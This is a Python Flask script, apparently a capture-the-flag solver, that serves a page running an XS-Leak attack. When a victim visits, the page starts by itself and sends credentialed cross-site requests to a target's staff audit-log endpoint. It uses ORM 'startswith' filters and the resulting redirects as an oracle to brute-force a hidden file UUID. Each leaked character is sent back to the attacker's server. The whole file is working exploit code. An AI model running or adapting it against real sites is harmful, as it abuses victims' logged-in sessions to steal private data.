import urllib.parse
from flask import Flask, render_template_string, request

app = Flask(__name__)

# CONFIGURATION
TARGET_BASE = "https://web.crypto.x-0r.com/"
KNOWN_ID = ""

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Redirect Solver (Fetch Mode)</title>
</head>
<body style="background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 40px;">
    <h1 style="border-bottom: 2px solid #00ff00;">> REDIRECT_FETCH_EXPLOIT.EXE</h1>
    <button id="startBtn" style="padding: 15px 30px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; margin: 20px 0;">
        EXECUTE BRUTEFORCE
    </button>

    <div style="background: #000; padding: 20px; border-radius: 5px; margin-top: 20px;">
        <div id="status" style="margin-bottom: 10px; color: #888;">Status: Awaiting user gesture...</div>
        <div id="uuid" style="font-size: 28px; letter-spacing: 2px;">UUID: <span id="leaked"></span></div>
    </div>

    <script>
        const CHARSET = "0123456789abcdef";
        let leaked = ""; 

        async function probe(prefix) {
            const params = new URLSearchParams({
                "Action": "Created Case",
                "TargetId": "{{ target_id }}",
                "Staff__Department__Name__Staff__CreatedFiles__IsPublished": "0",
                "Staff__Department__Name__Staff__CreatedFiles__Uuid__startswith": prefix
            });

            const targetUrl = `{{ target_base }}/staff/auditlog?${params.toString()}`;

            try {
                // Using no-cors and redirect: manual gives us an 'opaqueredirect' type 
                // if the server tries to redirect us.
                const response = await fetch(targetUrl, {
                    method: 'GET',
                    mode: 'no-cors',
                    credentials: 'include', // Exploits the SameSite=None configuration
                    redirect: 'manual' 
                });

                // MATCH CASE:
                // The server issued a redirect (e.g., 302 Found)
                if (response.type === 'opaqueredirect') {
                    return true;
                }
                
                // MISS CASE:
                // The server returned a standard HTTP response (e.g., 200 OK)
                return false;

            } catch (e) {
                console.error("Probe error:", e);
                return false;
            }
        }

        async function solve() {
            document.getElementById("status").innerText = "Status: IN_PROGRESS...";

            while (leaked.length < 36) {
                // Handle UUID dashes
                if ([8, 13, 18, 23].includes(leaked.length)) {
                    leaked += "-";
                    document.getElementById("leaked").innerText = leaked;
                    continue;
                }

                let found = false;
                for (let c of CHARSET) {
                    document.getElementById("status").innerText = `Probing: ${leaked}${c}`;

                    const isMatch = await probe(leaked + c);
                    if (isMatch) {
                        leaked += c;
                        document.getElementById("leaked").innerText = leaked;

                        // Send results back to the Python terminal
                        fetch("/log?val=" + leaked);
                        found = true;
                        break;
                    }
                }

                if (!found) {
                    document.getElementById("status").innerText = "Status: STALLED (No Match Found)";
                    break;
                }
            }
            
            if (leaked.length === 36) {
                document.getElementById("status").innerText = "Status: COMPLETE.";
            }
        }

        // Runs automatically when the page loads
        window.onload = () => {
            console.log("Auto-starting exploit...");
            solve();
        };
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(
        HTML, target_base=TARGET_BASE, target_id=KNOWN_ID
    )

@app.route("/log")
def log():
    val = request.args.get("val")
    print(f"\n[+] PROGRESS: {val}")
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)